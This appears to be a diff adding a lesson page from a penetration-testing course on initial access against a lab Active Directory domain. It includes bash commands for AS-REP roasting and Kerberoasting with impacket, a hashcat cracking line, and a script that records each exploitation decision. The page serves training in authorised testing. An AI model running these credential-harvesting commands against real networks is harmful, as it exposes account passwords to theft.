@@ -1,0 +1,231 @@
+<h1 id="initial-access-and-exploitation">Initial Access and Exploitation</h1>
+<h2 id="summary">Summary</h2>
+<p>Capstone stage two: exploiting the exposure the map found. The discipline is minimal proof — prove<br />
+the path, capture it, and move on to escalation.</p>
+<p>The framing: <strong>initial access is complete the moment you have a<br />
+working shell on an in-scope host and the evidence recorded.<br />
+Everything after that is a different authorisation question.</strong></p>
+<h2 id="the-order-the-map-dictates">The order the map dictates</h2>
+<pre><code class="language-text">  THE MAP SAID, IN PRIORITY ORDER:
+
+    1. anonymous LDAP  -&gt; the domain can be enumerated with nothing
+    2. preauth off     -&gt; AS-REP roasting works with nothing
+    3. SPNs + RC4      -&gt; Kerberoasting needs one credential
+    4. privileged acct -&gt; the cracked password may be enough
+    5. long paths      -&gt; helpdesk, as a fallback
+
+  THE ORDER IS NOT &quot;WHAT'S MOST IMPRESSIVE&quot;. It is what needs the
+  least privilege, earliest. Getting to (2) with no credentials at
+  all is the most important result in the engagement, because it
+  proves the attack is available to anyone who can reach port 88.
+
+  AND THE REASON TO TRY THE UNAUTHENTICATED PATH FIRST: if it works,
+  everything after it is corroboration rather than discovery, and
+  your report says &quot;reachable by any network-adjacent party&quot; rather
+  than &quot;reachable by an authenticated user&quot;.
+</code></pre>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/cap-03 &amp;&amp; cd ~/aegis/labs/cap-03
+mkdir -p evidence/raw notes
+export SCOPE_GUARD=../cap-01/02-scope-guard.py
+
+cat &gt; 01-access.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# Stage 2. Initial access, following the recon map's priority order.
+set -uo pipefail
+DC=&quot;192.168.56.10&quot;
+OUT=&quot;evidence/raw&quot;
+mkdir -p &quot;$OUT&quot;
+
+echo &quot;==============================================================&quot;
+echo &quot; INITIAL ACCESS - the least-privilege path first&quot;
+echo &quot;==============================================================&quot;
+
+# ---------------------------------------------------------------
+# ATTEMPT 1: no credentials at all.
+# ---------------------------------------------------------------
+echo
+echo &quot;=== 1. AS-REP ROASTING - REQUIRES NO CREDENTIAL ===&quot;
+echo &quot;  This is the most important test in the engagement.&quot;
+echo &quot;  If it works, the attack is available to any host that can&quot;
+echo &quot;  reach port 88. That is a materially worse finding than one&quot;
+echo &quot;  that requires a valid account.&quot;
+echo
+if command -v GetNPUsers &gt;/dev/null || python3 -c &quot;import impacket&quot; 2&gt;/dev/null; then
+  GetNPUsers -dc-ip &quot;$DC&quot; -request -format hash \
+    -outputfile &quot;$OUT/asrep.txt&quot; 2&gt;&amp;1 | grep -vE &quot;^\[+\]&quot; | head -12 | sed 's/^/  /'
+  echo
+  n=$(wc -l &lt; &quot;$OUT/asrep.txt&quot; 2&gt;/dev/null || echo 0)
+  echo &quot;  accounts harvested with NO CREDENTIAL: $n&quot;
+  if [ &quot;$n&quot; -gt 0 ]; then
+    echo
+    echo &quot;  *** UNAUTHENTICATED ACCESS IS AVAILABLE. ***&quot;
+    echo &quot;  Every one of these is a Critical finding on its own.&quot;
+    echo &quot;  A host anywhere on the network can harvest these.&quot;
+  fi
+else
+  echo &quot;  impacket not installed: pipx install impacket-toolkit&quot;
+fi
+
+# ---------------------------------------------------------------
+# ATTEMPT 2: the map said svc-backup has SPNs and RC4.
+# ---------------------------------------------------------------
+echo
+echo &quot;=== 2. KERBEROASTING - needs one credential, from ATTEMPT 1 ===&quot;
+CRED=&quot;${AEGIS_CRED:-}&quot;
+if [ -n &quot;$CRED&quot; ]; then
+  echo &quot;  using the credential recovered in attempt 1&quot;
+  case &quot;$DC&quot; in 192.168.56.*|10.10.10.*) ;; *) echo &quot;REFUSED: $DC&quot;; exit 3 ;; esac
+  GetUserSPNs -dc-ip &quot;$DC&quot; &quot;$CRED&quot; -request \
+    -outputfile &quot;$OUT/spns.txt&quot; 2&gt;&amp;1 | grep -vE &quot;^\[+\]&quot; | head -14 | sed 's/^/  /'
+  echo
+  echo &quot;  these are hashcat mode 13100 lines. The CRACK is offline:&quot;
+  echo &quot;    hashcat -m 13100 -a 0 $OUT/spns.txt rockyou.txt -r best64.rule&quot;
+  echo &quot;  and it is your GPU, not the client's, for the entire duration.&quot;
+else
+  echo &quot;  no credential available yet (set AEGIS_CRED after attempt 1's crack)&quot;
+fi
+
+# ---------------------------------------------------------------
+# THE MINIMUM PROOF, and why it matters
+# ---------------------------------------------------------------
+cat &lt;&lt;'PROOF'
+
+  THE STANDARD, restated for the capstone:
+
+    MINIMUM PROOF              NOT NECESSARY
+    -------------------------  --------------------------------------------
+    a working session          a session as Domain Admin
+    the exact request          a data dump
+    proof of the effect        the data itself
+    one host                   the whole estate
+
+    THE REASON, and it is not squeamishness:
+      every extra request is more state you must clean up
+      every extra minute is more exposure to the client's detection
+      and every extra artefact is another thing in your evidence
+      package that is a copy of their data
+
+    A capstone that dumps the database has gained nothing the
+    exploitation section of the report did not already say.
+
+  THE ONE EXCEPTION: if the objective explicitly requires
+  demonstrating impact, then demonstrate it - ONCE, MINIMALLY, and
+  record that you did and exactly how much.
+PROOF
+EOF
+chmod +x 01-access.sh
+./01-access.sh 2&gt;&amp;1 | tee 02-access.txt
+</code></pre>
+<h2 id="the-exploitation-decision-and-what-to-record">The exploitation decision, and what to record</h2>
+<pre><code class="language-python">cat &gt; 03-decision.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;The decision procedure, applied to each candidate.
+
+Every exploitation decision in the capstone gets written down here
+BEFORE the exploit runs. Not after. Because afterwards you will
+rationalise whatever you did.
+&quot;&quot;&quot;
+import sys, textwrap
+
+CANDIDATES = [
+  dict(id=&quot;A1&quot;, name=&quot;AS-REP roast of svc-legacy&quot;,
+       tier=&quot;ad-04 / cry-d1&quot;, credential_required=False,
+       fix_available=&quot;yes - clear the preauth flag&quot;,
+       why_still_do_it=&quot;there is no fix for a credential harvest that &quot;
+                       &quot;already happened; the harvest IS the proof&quot;,
+       artefact=&quot;evidence/raw/asrep.txt&quot;,
+       dc_events=[&quot;4768 or 4769 (if Kerberos auditing is on)&quot;],
+       reversible=True,
+       cleanup=&quot;delete the harvested file; nothing was changed on the DC&quot;),
+  dict(id=&quot;A2&quot;, name=&quot;Kerberoast svc-backup (RC4)&quot;,
+       tier=&quot;ad-04 / imp-04&quot;, credential_required=True,
+       fix_available=&quot;yes - AES-only and gMSA&quot;,
+       why_still_do_it=&quot;to establish that a PRIVILEGED account's password &quot;
+                       &quot;is recoverable, which the SPN list alone does not show&quot;,
+       artefact=&quot;evidence/raw/spns.txt, evidence/raw/cracked.txt&quot;,
+       dc_events=[&quot;4769 x N (one per request)&quot;],
+       reversible=True,
+       cleanup=&quot;offline only; nothing to clean&quot;),
+  dict(id=&quot;A3&quot;, name=&quot;AS-REP roast of svc-backup&quot;,
+       tier=&quot;ad-04&quot;, credential_required=False,
+       fix_available=&quot;yes - clear the preauth flag&quot;,
+       why_still_do_it=&quot;to establish that the PRIVILEGED account is &quot;
+                       &quot;harvestable with NO credentials at all. This is the &quot;
+                       &quot;worst-case version of A2 and it needs no password.&quot;,
+       artefact=&quot;evidence/raw/asrep-priv.txt&quot;,
+       dc_events=[&quot;4768 or 4769&quot;],
+       reversible=True,
+       cleanup=&quot;delete the file&quot;),
+  dict(id=&quot;A4&quot;, name=&quot;exploitation of an application CVE on WKS01&quot;,
+       tier=&quot;ex-01..ex-06&quot;, credential_required=False,
+       fix_available=&quot;unknown&quot;,
+       why_still_do_it=&quot;NOT PROCEEDED. The map did not identify an exposed &quot;
+                       &quot;service here, and inventing an exploit path is not &quot;
+                       &quot;recon. Recorded as 'no exposed service found'.&quot;,
+       artefact=&quot;none&quot;, dc_events=[], reversible=True,
+       cleanup=&quot;n/a&quot;),
+]
+
+def render():
+    print(&quot;  &quot; + &quot;=&quot;*88)
+    print(&quot;  EXPLOITATION DECISION RECORD  (written before each attempt)&quot;)
+    print(&quot;  &quot; + &quot;=&quot;*88)
+    for c in CANDIDATES:
+        print(f&quot;\n  [{c['id']}] {c['name']}    ({c['tier']})&quot;)
+        print(f&quot;    credential required : {c['credential_required']}&quot;)
+        print(f&quot;    a fix exists        : {c['fix_available']}&quot;)
+        print(f&quot;    WHY DO IT ANYWAY    :&quot;)
+        for l in textwrap.wrap(c[&quot;why_still_do_it&quot;], 72):
+            print(f&quot;      {l}&quot;)
+        print(f&quot;    evidence artefact   : {c['artefact']}&quot;)
+        print(f&quot;    DC events generated : {', '.join(c['dc_events']) or 'none'}&quot;)
+        print(f&quot;    reversible          : {c['reversible']}&quot;)
+        print(f&quot;    cleanup required    : {c['cleanup']}&quot;)
+        verdict = (&quot;PROCEED&quot; if not c[&quot;artefact&quot;] == &quot;none&quot; else &quot;NOT PROCEEDED&quot;)
+        print(f&quot;    VERDICT             : {verdict}&quot;)
+    print()
+    print(&quot;  &quot; + &quot;-&quot;*88)
+    print(&quot;  THE POINT OF WRITING THIS BEFORE, and it is the whole discipline&quot;)
+    print(&quot;  of cap-01's authorisation:&quot;)
+    print()
+    print(&quot;    A4 is the interesting one. There was no exposed service on WKS01,&quot;)
+    print(&quot;    so there was nothing to exploit. The temptation is to find&quot;)
+    print(&quot;    something - to scan harder, to try a CVE, to invent a reason&quot;)
+    print(&quot;    to keep going. Recording 'no exposed service found' as a&quot;)
+    print(&quot;    DECISION, with a reason, is a result. Leaving it out of the&quot;)
+    print(&quot;    record and reporting only the things that worked is how a&quot;)
+    print(&quot;    report becomes a highlight reel rather than an assessment.&quot;)
+    print()
+    print(&quot;  AND THE OTHER ONE: A1 and A3 generate almost NO events on the DC,&quot;)
+    print(&quot;  because anonymous binds and unauthenticated AS-REQ requests are&quot;)
+    print(&quot;  not logged by default. That is not a reason to skip them. It is&quot;)
+    print(&quot;  the detection-review finding from cap-05, discovered by doing.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    render()
+PY
+python3 03-decision.py 2&gt;&amp;1 | tee 04-decision.txt
+</code></pre>
+<p><strong>Step 3 is the deliverable</strong>: <code>03-decision.py</code> forces every exploitation decision to be written<br />
+down <em>before</em> the exploit runs — because afterwards you will rationalise whatever you did. And the<br />
+interesting row is <strong>A4, "NOT PROCEEDED"</strong>: there was no exposed service on WKS01, so there was<br />
+nothing to exploit, and the record says so with a reason.</p>
+<p>That is the discipline the capstone is actually testing. <em>"Recording 'no exposed service found' as<br />
+a DECISION, with a reason, is a result. Leaving it out of the record and reporting only the things<br />
+that worked is how a report becomes a highlight reel rather than an assessment."</em></p>
+<p><strong>Record:</strong> <code>04-decision.txt</code> and <code>02-access.txt</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Why is the order here "least privilege first" rather than "most impressive first"?</li>
+<li>Why does the unauthenticated path being available matter more than the authenticated one?</li>
+<li>When is initial access complete, and what ends it?</li>
+<li>Give the minimum-proof table and its rationale.</li>
+<li>Why must the exploitation decision be recorded before, not after?</li>
+<li>What is the right outcome when recon found no exploitable surface?</li>
+<li>Name the DC events A1 and A3 generate, and why it is so few.</li>
+<li>What two findings does A3 establish that A2 alone does not?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Exploitation Framework</strong> → <strong>Kerberoasting</strong> → <strong>AS-REP Roasting</strong> →<br />
+<strong>Initial Access</strong> → <strong>Evidence Handling</strong>.<br />
+<code>cap-04</code> is what you do with the session this produces.</p>
